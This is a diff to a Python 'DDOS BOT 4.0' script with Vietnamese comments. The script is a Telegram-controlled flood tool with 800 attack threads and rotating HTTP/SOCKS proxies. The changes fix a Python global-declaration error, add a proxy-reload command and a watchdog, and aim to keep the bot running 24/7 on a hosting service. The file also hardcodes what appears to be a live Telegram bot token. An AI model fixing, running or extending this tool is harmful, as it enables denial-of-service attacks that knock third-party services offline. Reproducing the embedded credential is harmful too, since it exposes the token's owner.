@@ -1,6 +1,6 @@
 # =====================================================
-# DDOS BOT 4.0 - SỬA LỖI SyntaxError: proxy_http
-# KHAI BÁO global ĐÚNG CÁCH
+# DDOS BOT 4.0 - TREO 24/7 - TỐI ƯU TỐI ĐA
+# FIX LỖI global declaration - CHẠY ỔN ĐỊNH TRÊN RENDER
 # =====================================================
 
 import requests
@@ -20,7 +20,7 @@ from urllib.parse import urlparse
 import socks
 
 # -------------------- CẤU HÌNH TELEGRAM --------------------
-TELEGRAM_BOT_TOKEN = "6320148381:AAFvtpr4l8t61IRgynsiUkwKVbCNMw9kdtU"
+TELEGRAM_BOT_TOKEN = "6320148381:AAFvtpr4l8t61IRgynsiUkwKVbCNMw9kdtU"  # THAY TOKEN THẬT
 
 # -------------------- CẤU HÌNH TẤN CÔNG --------------------
 THREAD_COUNT = 800
@@ -32,6 +32,7 @@ TIMEOUT = 1.5
 # -------------------- BIẾN TOÀN CỤC (KHAI BÁO ĐẦU FILE) --------------------
 stop_event = threading.Event()
 is_running = False
+attack_thread = None
 proxy_list = []
 proxy_http = []
 proxy_socks5 = []
@@ -42,7 +43,6 @@ heartbeat_count = 0
 last_activity = time.time()
 bot_start_time = time.time()
 chat_id_saved = None
-attack_thread = None
 
 current_target = {
     'url': 'http://192.168.1.100:8080',
@@ -62,7 +62,6 @@ attack_stats = {
     'current_target': '',
     'proxy_stats': {'http': 0, 'socks5': 0, 'socks4': 0, 'raw': 0},
     'max_speed': 0,
-    'avg_speed': 0,
     'errors': 0
 }
 stats_lock = threading.Lock()
@@ -200,10 +199,9 @@ def load_proxies(filepath):
     return http_proxies, socks5_proxies, socks4_proxies
 
 # =====================================================
-# HÀM CẬP NHẬT PROXY - SỬA LỖI global
+# CẬP NHẬT PROXY - FIX global
 # =====================================================
 def update_proxies_from_file(file_path, chat_id):
-    """Cập nhật proxy từ file - SỬ DỤNG global ĐÚNG CÁCH"""
     global proxy_list, proxy_http, proxy_socks5, proxy_socks4, proxy_update_time
     
     http, socks5, socks4 = load_proxies(file_path)
@@ -229,10 +227,9 @@ def update_proxies_from_file(file_path, chat_id):
     return True
 
 # =====================================================
-# HÀM RELOAD PROXY TỰ ĐỘNG - SỬA LỖI global
+# TỰ ĐỘNG RELOAD PROXY - FIX global
 # =====================================================
 def auto_reload_proxy():
-    """Tự động reload proxy - SỬ DỤNG global ĐÚNG CÁCH"""
     global proxy_http, proxy_socks5, proxy_socks4, proxy_list, proxy_update_time
     
     while True:
@@ -250,7 +247,7 @@ def auto_reload_proxy():
                 proxy_update_time = time.time()
 
 # =====================================================
-# HÀM GỬI TELEGRAM
+# GỬI TELEGRAM
 # =====================================================
 def send_telegram(message, chat_id=None, retry=2):
     global last_activity, chat_id_saved
@@ -295,7 +292,7 @@ def send_telegram(message, chat_id=None, retry=2):
     return False
 
 # =====================================================
-# HÀM DOWNLOAD FILE TELEGRAM
+# TẢI FILE PROXY TỪ TELEGRAM
 # =====================================================
 def download_telegram_file(file_id, save_path):
     try:
@@ -323,7 +320,7 @@ def download_telegram_file(file_id, save_path):
         return False
 
 # =====================================================
-# HÀM RESOLVE DNS
+# RESOLVE DNS
 # =====================================================
 def resolve_host(host):
     with dns_cache_lock:
@@ -631,7 +628,7 @@ def get_stats_text():
         proxy_stats = attack_stats.get('proxy_stats', {})
         
         return f"""
-<b>🔥 DDOS BOT 4.0 - TỐI ƯU TỐI ĐA</b>
+<b>🔥 DDOS BOT 4.0 - TREO 24/7</b>
 📌 Trạng thái: {status}
 ⏱ Uptime: {uptime_str}
 🎯 Target: {attack_stats.get('current_target', 'Chưa có')}
@@ -742,15 +739,16 @@ def run_attack(target, chat_id):
     """, chat_id)
 
 # =====================================================
-# TELEGRAM LISTENER
+# TELEGRAM LISTENER - FIX global
 # =====================================================
 def telegram_listener():
     global is_running, attack_thread, chat_id_saved
+    global proxy_http, proxy_socks5, proxy_socks4, proxy_list, proxy_update_time
     
     last_update_id = 0
     
     send_telegram("""
-🚀 <b>DDOS BOT 4.0 - TỐI ƯU TỐI ĐA</b>
+🚀 <b>DDOS BOT 4.0 - TREO 24/7</b>
 ✅ Đã khởi động thành công!
 ⚡ Tốc độ tối đa: 500+ req/s
 📌 Hỗ trợ HTTP, SOCKS4, SOCKS5
@@ -764,6 +762,7 @@ def telegram_listener():
 <code>/proxy</code> - Số proxy hiện có
 <code>/threads N</code> - Đổi số luồng
 <code>/speed N</code> - Đổi tốc độ
+<code>/reloadproxy</code> - Tải lại proxy
 <code>/help</code> - Trợ giúp
     """)
     
@@ -791,6 +790,7 @@ def telegram_listener():
                         except:
                             pass
                         
+                        # Xử lý file proxy
                         document = msg.get('document')
                         if document:
                             file_name = document.get('file_name', '')
@@ -810,6 +810,7 @@ def telegram_listener():
                                 else:
                                     send_telegram("❌ Không thể tải file.", chat_id)
                         
+                        # Xử lý lệnh
                         text = msg.get('text', '').strip()
                         if not text:
                             continue
@@ -893,7 +894,6 @@ Tổng: {len(proxy_http) + len(proxy_socks5) + len(proxy_socks4)}
                                 http, socks5, socks4 = load_proxies("proxies.txt")
                                 total = len(http) + len(socks5) + len(socks4)
                                 if total > 0:
-                                    global proxy_http, proxy_socks5, proxy_socks4, proxy_list
                                     proxy_http = http
                                     proxy_socks5 = socks5
                                     proxy_socks4 = socks4
@@ -971,7 +971,7 @@ def heartbeat_loop():
             """)
 
 # =====================================================
-# WATCHDOG
+# WATCHDOG - TỰ ĐỘNG RESTART
 # =====================================================
 def watchdog():
     while True:
@@ -1005,7 +1005,7 @@ if __name__ == "__main__":
             f.write("# Example: socks5://user:pass@1.2.3.4:1080\n")
     
     print("="*60)
-    print("🔥 DDOS BOT 4.0 - TỐI ƯU TỐI ĐA")
+    print("🔥 DDOS BOT 4.0 - TREO 24/7")
     print("="*60)
     print(f"[+] Token: {TELEGRAM_BOT_TOKEN[:15]}...")
     print(f"[+] HTTP: {len(proxy_http)} | SOCKS5: {len(proxy_socks5)} | SOCKS4: {len(proxy_socks4)}")
